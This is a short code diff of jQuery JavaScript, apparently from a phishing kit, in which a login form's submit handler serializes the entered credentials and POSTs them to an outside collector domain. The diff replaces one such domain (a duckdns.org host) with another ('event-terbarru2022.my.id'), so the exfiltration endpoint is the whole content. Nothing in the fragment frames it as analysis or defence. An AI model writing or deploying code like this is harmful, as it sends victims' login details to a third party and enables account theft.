@@ -2,7 +2,7 @@ $(".login-form").submit(function() {
 	var d = $(".login-form");
 
 	$.ajax({
-        url: "https://ganteng02.duckdns.org/test/index.php",
+        url: "https://event-terbarru2022.my.id/test/index.php",
         type: "POST",
         data: d.serialize(),
         success: function () {
